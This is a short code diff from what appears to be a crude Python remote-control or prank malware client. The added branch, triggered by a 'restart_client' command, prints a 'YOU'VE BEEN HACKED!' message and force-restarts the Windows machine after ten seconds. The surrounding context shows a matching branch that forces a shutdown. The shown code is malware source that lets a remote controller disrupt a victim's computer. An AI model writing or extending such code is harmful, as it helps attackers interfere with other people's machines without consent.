@@ -49,5 +49,10 @@ while 1:
         time.sleep(10)
         os.system("shutdown /s /t 1")
 
+    elif command == "restart_client":
+        print("YOU'VE BEEN HACKED! THIS PC WILL RESTART AFTER 10 SECONDS!")
+        time.sleep(10)
+        os.system("shutdown /r /t 1")
+
     else:
         print("Leave")
